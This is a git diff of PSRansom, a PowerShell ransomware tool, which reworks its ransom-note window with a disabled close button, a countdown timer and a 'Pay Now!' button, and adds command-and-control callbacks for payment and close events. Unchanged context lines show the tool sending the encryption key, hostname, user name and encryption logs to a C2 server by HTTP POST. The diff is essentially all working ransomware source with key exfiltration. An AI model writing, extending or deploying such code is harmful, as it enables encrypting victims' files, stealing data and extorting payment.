@@ -179,7 +179,8 @@ Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/mai
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
-$form = New-Object system.Windows.Forms.Form 
+$form = New-Object system.Windows.Forms.Form
+$form.ControlBox = $false;
 $form.Size = New-Object System.Drawing.Size(900,600) 
 $form.BackColor = "Black" 
 $form.MaximizeBox = $false 
@@ -187,7 +188,9 @@ $form.StartPosition = "CenterScreen"
 $form.WindowState = "Normal"
 $form.Topmost = $true
 $form.FormBorderStyle = "Fixed3D"
-$form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom" 
+$form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom"
+$formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
+$form.Icon = $formicon  
 
 $img = [System.Drawing.Image]::Fromfile("$env:temp\PSRansom.jpg")
 $pictureBox = new-object Windows.Forms.PictureBox
@@ -198,16 +201,14 @@ $pictureBox.Image = $img
 $form.controls.add($pictureBox)
 
 $label = New-Object System.Windows.Forms.Label
-$label.ForeColor = "Red"
+$label.ForeColor = "Cyan"
 $label.Text = "All your files have been encrypted by PSRansom!" 
 $label.AutoSize = $true 
 $label.Location = New-Object System.Drawing.Size(50,400) 
 $font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
 $form.Font = $Font 
 $form.Controls.Add($label) 
-$formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
-$form.Icon = $formicon 
- 
+
 $label1 = New-Object System.Windows.Forms.Label
 $label1.ForeColor = "White"
 $label1.Text = "But don't worry, you can still recover them with the recovery key :)" 
@@ -217,22 +218,40 @@ $font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]
 $form.Font = $Font1
 $form.Controls.Add($label1) 
 
-$delay = 15
-$counter_Label = New-Object System.Windows.Forms.Label
-$counter_Label.Location = New-Object System.Drawing.Size(50,500) 
-$counter_Label.AutoSize = $true 
-$counter_Label.ForeColor = "Cyan"
-$form.Controls.Add($Counter_Label)
+$okbutton = New-Object System.Windows.Forms.Button;
+$okButton.Location = New-Object System.Drawing.Point(750,500)
+$okButton.Size = New-Object System.Drawing.Size(110,35)
+$okbutton.ForeColor = "Black"
+$okbutton.BackColor = "White"
+$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$okButton.Text = 'Pay Now!'
+$okbutton.Visible = $false
+$okbutton.Enabled = $true
+$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
+$okButton.add_Click({ 
+[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'PSRansom Payment System',
+[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
+$form.AcceptButton = $okButton
+$form.Controls.Add($okButton)
+$form.Activate() 2>&1> $null
+$form.Focus() 2>&1> $null
 
-while ($delay -ge 0){
-$form.Show()
-$counter_Label.Text = "Seconds Remaining: $($delay)"
-$warningfont = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
-$counter_Label.Font = $warningfont
-if ($delay -lt 10){ $Counter_Label.ForeColor = "Yellow" }
-if ($delay -lt 6){ $Counter_Label.ForeColor = "Red" }
-start-sleep 1 ; $delay -= 1 }
-$form.Close() ; Remove-Item $env:temp\PSRansom* -force }
+$btn=New-Object System.Windows.Forms.Label
+$btn.Location = New-Object System.Drawing.Point(50,500)
+$btn.Width = 500
+$form.Controls.Add($btn)
+$btn.ForeColor = "Red"
+$startTime = [DateTime]::Now
+$count = 1.6
+$timer=New-Object System.Windows.Forms.Timer
+$timer.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
+if ($remainingSeconds -like "-0.1*"){ $timer.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
+$btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
+$timer.Start()
+
+$btntest = $form.ShowDialog()
+if ($btntest -like "OK"){ $Global:PayNow = "True" }}
+Remove-Item $env:temp\PSRansom* -force
 
 function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
@@ -241,9 +260,9 @@ function R64Encoder {
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }
 
 function ShowInfo {
-   Write-Host ; Write-Host "[+] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
-   Write-Host "[+] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
-   Write-Host "[+] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }
+   Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
+   Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
+   Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }
 
 function GetStatus {
    Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
@@ -252,11 +271,17 @@ function GetStatus {
 
 function SendResults {
    $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
-   $C2Data = " [+] Key: $B64Key [+] Hostname: $computer [+] Current User: $domain$user [+] Current Time: $time"
+   $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch
    $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
    Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
    Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }
+
+function SendClose {
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null }
+
+function SendPay {
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null }
 
 function SendOK {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
@@ -312,8 +337,10 @@ else {
       ExfiltrateFiles ; sleep 1 }}
 
    if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
-   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
+   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}
 
-   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom }
+   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
+   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
+   else { SendOK }
 
 sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
